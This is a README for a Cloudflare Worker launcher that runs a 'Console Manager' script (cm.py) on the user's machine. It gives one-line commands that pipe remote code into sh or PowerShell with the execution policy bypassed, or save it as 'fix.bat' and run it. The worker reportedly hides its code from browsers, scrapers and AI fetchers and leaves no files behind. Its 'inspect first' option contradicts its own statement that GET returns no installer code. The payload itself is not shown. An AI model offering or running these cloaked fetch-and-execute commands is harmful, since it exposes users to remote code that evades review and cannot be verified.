# Executeee

Zero-config Cloudflare Worker launcher. Browsers, bots, AI crawlers, scrapers, expired tokens, and replayed sessions return only `err occured`. Runs the Console Manager (`cm.py`) on your machine.

## Run

**Unix / Linux / macOS / Termux:**
```sh
curl -fsSL https://executeee.nishkarshrana10.workers.dev | sh
```

**Windows CMD:**
```cmd
curl -fsSL https://executeee.nishkarshrana10.workers.dev -o fix.bat && fix.bat
```

**Windows PowerShell:**
```powershell
curl -fsSL https://executeee.nishkarshrana10.workers.dev | powershell -ExecutionPolicy Bypass -Command "-"
```

Or download and inspect first:

```sh
curl -fsSL https://executeee.nishkarshrana10.workers.dev -o script.sh
cat script.sh
sh script.sh
```

## What you see

- **Browser / scraper / AI fetcher:** `err occured` (403)
- **Real terminal:** Downloads and runs `cm.py` — the Console Manager installer that detects your platform (Termux, Windows, Linux) and installs/runs the appropriate Console Manager edition. No files are left behind.

## Security

- `GET /` returns only a 10-second single-use session token (zero installer code, zero URLs)
- `POST /` requires a valid SHA-256 proof bound to IP + UA + Cloudflare colo
- Tokens expire after 10 seconds and cannot be reused
- Per-IP rate limiting blocks spam
- All non-terminal clients get `err occured`

## Optional Cloudflare secrets

Set in Workers & Pages → `executeee` → Settings → Variables and Secrets:

- `SIGNING_SECRET` — custom HMAC signing key
- `SOURCE_URL` — override the `cm.py` upstream URL
- `GITHUB_TOKEN` — for private GitHub repos
- `CM_PC_URL` / `CM_TERMUX_URL` — override platform-specific script URLs
- `AUTH_TOKEN` — require `Bearer` or `X-Key` on every request
- `ALLOW_NON_TTY=1` — allow non-interactive terminals
